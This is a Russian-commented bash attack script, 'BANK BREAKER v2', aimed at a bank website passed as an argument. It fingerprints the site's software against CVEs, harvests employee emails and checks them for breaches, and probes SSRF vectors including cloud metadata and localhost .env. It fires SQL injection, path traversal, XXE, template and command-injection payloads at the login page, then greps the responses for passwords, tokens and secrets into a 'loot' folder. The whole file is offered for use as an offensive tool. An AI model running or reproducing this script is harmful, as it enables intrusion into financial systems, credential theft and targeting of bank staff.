#!/bin/bash
# ╔══════════════════════════════════════════════════════════════╗
# ║   BANK BREAKER v2 — Полный цикл пробития брони             ║
# ║   ИИ + Соц-инженерия + Supply Chain + Insider + Beyond     ║
# ╚══════════════════════════════════════════════════════════════╝

TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 https://bank.com" && exit 1
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
BREACH_DIR="$HOME/.shadow_breach_v2/$DOMAIN"
mkdir -p "$BREACH_DIR"/{recon,origin,beyond,insider,supply,social,evolution,loot}

RED='\033[0;31m'; GR='\033[0;32m'; CY='\033[0;36m'; YL='\033[1;33m'; WH='\033[1;37m'; NC='\033[0m'

echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║   🏦 BANK BREAKER v2 — Полный цикл                          ║${NC}"
echo -e "${RED}║   BEYOND → ORIGIN → SUPPLY → SOCIAL → INSIDER → EVOLVE    ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

# ═══════════════════════════════════════════════════════════════
# ФАЗА 0: BEYOND — Дезориентация защиты
# ═══════════════════════════════════════════════════════════════
echo -e "${CY}[BREAKER] 🌌 ФАЗА 0: BEYOND — отвлечение защиты...${NC}"
bash ~/.shadow_beyond.sh "$TARGET" > "$BREACH_DIR/beyond/log.txt" 2>&1 &
BEYOND_PID=$!
echo "  Beyond запущен (PID $BEYOND_PID). Защита отвлечена."
echo ""

# ═══════════════════════════════════════════════════════════════
# ФАЗА 1: ORIGIN HUNTING + SUPPLY CHAIN
# ═══════════════════════════════════════════════════════════════
echo -e "${CY}[BREAKER] 🔍 ФАЗА 1: Origin + Supply Chain...${NC}"

# 1A: Origin
bash ~/.shadow_origin_hunter.sh "$TARGET" 2>/dev/null
ORIGIN_FILE="$HOME/.shadow_origin_ips/$DOMAIN.txt"
ORIGIN_IP=""
[ -f "$ORIGIN_FILE" ] && ORIGIN_IP=$(head -1 "$ORIGIN_FILE")
[ -z "$ORIGIN_IP" ] && ORIGIN_IP="$DOMAIN"

# 1B: Supply Chain — ищем технологии банка
echo "[BREAKER] 🔗 Анализ Supply Chain..."
curl -sk --max-time 5 "$TARGET" -o "$BREACH_DIR/supply/index.html" 2>/dev/null
curl -sk --max-time 5 -I "$TARGET" -o "$BREACH_DIR/supply/headers.txt" 2>/dev/null

# Извлекаем технологии
TECH=$(grep -oiE 'wordpress|drupal|joomla|laravel|symfony|django|flask|express|react|vue|angular|jquery[0-9.-]+|bootstrap[0-9.-]+|nginx[0-9.-]+|apache[0-9.-]+|php[0-9.-]+|mysql|postgresql|mongodb|redis' "$BREACH_DIR/supply/index.html" 2>/dev/null | sort -u | tr '\n' ' ')
SERVER=$(grep -i "Server:" "$BREACH_DIR/supply/headers.txt" 2>/dev/null | head -1)

echo "  Сервер: $SERVER"
echo "  Технологии: $TECH"

# Ищем известные уязвимости для этих технологий
echo ""
echo "  🔗 Известные CVE:"
for tech in $TECH; do
    case "$tech" in
        *jquery*)
            ver=$(echo "$tech" | grep -oP '[0-9.]+')
            [ -n "$ver" ] && [ "$(echo "$ver" | cut -d. -f1)" -lt 3 ] && echo "    💀 jQuery $ver — XSS уязвимость (CVE-2020-11023)"
            ;;
        *bootstrap*)
            ver=$(echo "$tech" | grep -oP '[0-9.]+')
            [ -n "$ver" ] && [ "$(echo "$ver" | cut -d. -f1)" -lt 4 ] && echo "    💀 Bootstrap $ver — XSS (CVE-2019-8331)"
            ;;
        *php*)
            ver=$(echo "$tech" | grep -oP '[0-9.]+')
            [ -n "$ver" ] && [ "$(echo "$ver" | cut -d. -f1)" -lt 8 ] && echo "    💀 PHP $ver — RCE (CVE-2019-11043)"
            ;;
        *nginx*)
            ver=$(echo "$tech" | grep -oP '[0-9.]+')
            [ -n "$ver" ] && echo "    ⚠️ Nginx $ver — проверь path traversal"
            ;;
        *apache*)
            echo "    ⚠️ Apache — проверь Log4j (CVE-2021-44228), Struts (CVE-2017-5638)"
            ;;
        *wordpress*|*drupal*|*joomla*)
            echo "    💀 CMS — ищи плагины, темы, админку"
            ;;
    esac
done
echo ""

# ═══════════════════════════════════════════════════════════════
# ФАЗА 2: SOCIAL — Социальная инженерия
# ═══════════════════════════════════════════════════════════════
echo -e "${CY}[BREAKER] 👤 ФАЗА 2: Social Engineering...${NC}"

# Ищем email'ы сотрудников
grep -oP '[a-zA-Z0-9._%+-]+@'"$DOMAIN" "$BREACH_DIR/supply/index.html" 2>/dev/null | sort -u > "$BREACH_DIR/social/emails.txt"

# Ищем LinkedIn сотрудников (через Google dorks)
echo "  Поиск сотрудников..."
DORKS=(
    "site:linkedin.com \"$DOMAIN\" engineer"
    "site:linkedin.com \"$DOMAIN\" developer"
    "site:linkedin.com \"$DOMAIN\" admin"
    "site:linkedin.com \"$DOMAIN\" security"
)
for dork in "${DORKS[@]}"; do
    encoded=$(echo "$dork" | sed 's/ /%20/g;s/:/%3A/g;s/"/%22/g')
    echo "    🔍 $dork" >> "$BREACH_DIR/social/dorks.txt"
done

# Ищем утекшие пароли (Have I Been Pwned API)
echo "  Проверка утечек..."
for email in $(head -5 "$BREACH_DIR/social/emails.txt" 2>/dev/null); do
    [ -z "$email" ] && continue
    hibp=$(curl -sk "https://haveibeenpwned.com/api/v3/breachedaccount/$email" -H "hibp-api-key: 0" 2>/dev/null)
    [ -n "$hibp" ] && echo "    💀 $email — БЫЛ В УТЕЧКЕ!" && echo "$email — УТЕЧКА" >> "$BREACH_DIR/social/leaked.txt"
done

echo "  Сотрудников найдено: $(wc -l < $BREACH_DIR/social/emails.txt 2>/dev/null || echo 0)"
echo "  Утечек: $(wc -l < $BREACH_DIR/social/leaked.txt 2>/dev/null || echo 0)"
echo ""

# ═══════════════════════════════════════════════════════════════
# ФАЗА 3: INSIDER — Сервер атакует сам себя
# ═══════════════════════════════════════════════════════════════
echo -e "${CY}[BREAKER] 🕴️ ФАЗА 3: Insider — атака изнутри...${NC}"

# Ищем SSRF через разные векторы
SSRF_VECTORS=(
    "?url=http://127.0.0.1:8080/admin"
    "?redirect=http://169.254.169.254/latest/meta-data/"
    "?callback=http://localhost/.env"
    "?webhook=http://10.0.0.1/internal"
    "/api/proxy?target=http://127.0.0.1:6379/"
)

for ssrf in "${SSRF_VECTORS[@]}"; do
    resp=$(curl -sk --max-time 3 -L "$TARGET$ssrf" -o "$BREACH_DIR/insider/ssrf_$(echo $ssrf | tr '/?:=' '_').txt" -w "%{http_code}" 2>/dev/null)
    [ "$resp" = "200" ] && echo -e "  ${RED}💀 SSRF ВОЗМОЖЕН: $ssrf → HTTP $resp${NC}"
    [ "$resp" != "200" ] && echo "  $ssrf → HTTP $resp"
done

# Пробуем через Origin IP
[ -n "$ORIGIN_IP" ] && [ "$ORIGIN_IP" != "$DOMAIN" ] && {
    echo ""
    echo "  Через Origin IP ($ORIGIN_IP):"
    for path in "/admin" "/internal" "/.env" "/.git/config" "/debug" "/status"; do
        code=$(curl -sk --max-time 3 -H "Host: $DOMAIN" "https://$ORIGIN_IP$path" -o "$BREACH_DIR/insider/origin_$(echo $path | tr '/' '_').txt" -w "%{http_code}" 2>/dev/null)
        [ "$code" = "200" ] && echo -e "    ${RED}💀 $path — HTTP $code (ОТКРЫТ!)${NC}"
        [ "$code" != "200" ] && echo "    $path — HTTP $code"
    done
}
echo ""

# ═══════════════════════════════════════════════════════════════
# ФАЗА 4: EVOLUTION — ИИ-эволюция атаки
# ═══════════════════════════════════════════════════════════════
echo -e "${CY}[BREAKER] 🧬 ФАЗА 4: Evolution — ИИ обучение...${NC}"

# Создаём 10 вариантов атаки на основе собранных данных
SUCCESS_COUNT=0
for gen in $(seq 1 10); do
    # Каждое поколение — новый вектор
    case $((gen % 5)) in
        0) payload="username=admin'--&password=x" ;;
        1) payload="file=../../etc/passwd" ;;
        2) payload='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' ;;
        3) payload="{{7*7}}" ;;
        4) payload=";id;whoami;cat /etc/passwd" ;;
    esac

    code=$(curl -sk --max-time 3 \
        -H "Host: $DOMAIN" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -H "X-Forwarded-For: $ORIGIN_IP" \
        -H "X-Real-IP: $ORIGIN_IP" \
        -d "$payload" \
        "https://$ORIGIN_IP/login" \
        -o "$BREACH_DIR/evolution/gen_$gen.html" -w "%{http_code}" 2>/dev/null)

    if [ "$code" = "200" ] || [ "$code" = "302" ]; then
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        echo -e "  ${GR}Поколение $gen: $payload → HTTP $code ✅${NC}"
        cp "$BREACH_DIR/evolution/gen_$gen.html" "$BREACH_DIR/evolution/SUCCESS_$gen.html"
    else
        echo "  Поколение $gen: $payload → HTTP $code"
    fi
    sleep 1
done

# Обучаемся на успехах
[ $SUCCESS_COUNT -gt 0 ] && {
    echo ""
    echo -e "  ${GR}🧬 $SUCCESS_COUNT/10 успешных. Усиливаю лучшие векторы...${NC}"
    # В реальности здесь бы запускалась GAIA с лучшими генами
}
echo ""

# ═══════════════════════════════════════════════════════════════
# ФАЗА 5: LOOT — Сбор добычи
# ═══════════════════════════════════════════════════════════════
echo -e "${CY}[BREAKER] 💰 ФАЗА 5: Сбор добычи...${NC}"

# Собираем все успешные результаты
for f in "$BREACH_DIR"/**/*.html "$BREACH_DIR"/**/*.txt; do
    [ -f "$f" ] || continue
    grep -qiP "admin|password|root|token|key|secret|api_key|database|DB_|mysql|postgres|ssh|ftp|smtp" "$f" 2>/dev/null && {
        echo "  💎 $(basename $(dirname $f))/$(basename $f)" >> "$BREACH_DIR/loot/found.txt"
    }
done

# Объединяем все найденные секреты
find "$BREACH_DIR" -type f -exec grep -oP '(?:password|passwd|pwd|secret|key|token|api_key|DB_PASSWORD|DATABASE_URL)["\s:=]+["\']?[^"'\''\s]{8,}' {} \; 2>/dev/null | sort -u > "$BREACH_DIR/loot/secrets.txt"

LOOT_FILES=$(wc -l < "$BREACH_DIR/loot/found.txt" 2>/dev/null || echo 0)
SECRETS=$(wc -l < "$BREACH_DIR/loot/secrets.txt" 2>/dev/null || echo 0)

# Останавливаем Beyond
kill $BEYOND_PID 2>/dev/null

# ═══════════════════════════════════════════════════════════════
# ФИНАЛЬНЫЙ ОТЧЁТ
# ═══════════════════════════════════════════════════════════════
echo ""
echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║   🏦 BANK BREAKER v2 — ОПЕРАЦИЯ ЗАВЕРШЕНА                   ║${NC}"
echo -e "${RED}╠══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${RED}║   🌌 Beyond:       защита отвлечена                         ║${NC}"
echo -e "${RED}║   🔍 Origin:       $ORIGIN_IP${NC}"
echo -e "${RED}║   🔗 Supply Chain: $(echo $TECH | wc -w) технологий                        ║${NC}"
echo -e "${RED}║   👤 Social:       $(wc -l < $BREACH_DIR/social/emails.txt 2>/dev/null || echo 0) сотрудников, $(wc -l < $BREACH_DIR/social/leaked.txt 2>/dev/null || echo 0) утечек              ║${NC}"
echo -e "${RED}║   🕴️ Insider:      SSRF проверен                             ║${NC}"
echo -e "${RED}║   🧬 Evolution:    $SUCCESS_COUNT/10 успешных поколений                 ║${NC}"
echo -e "${RED}║   💰 Loot:         $LOOT_FILES находок, $SECRETS секретов              ║${NC}"
echo -e "${RED}╠══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${RED}║   ПОЛНЫЙ ЦИКЛ ЗАВЕРШЁН.                                     ║${NC}"
echo -e "${RED}║   Разведка → Отвлечение → Supply Chain → Соц-инженерия     ║${NC}"
echo -e "${RED}║   → Insider → Эволюция → Добыча.                            ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  📁 $BREACH_DIR/"
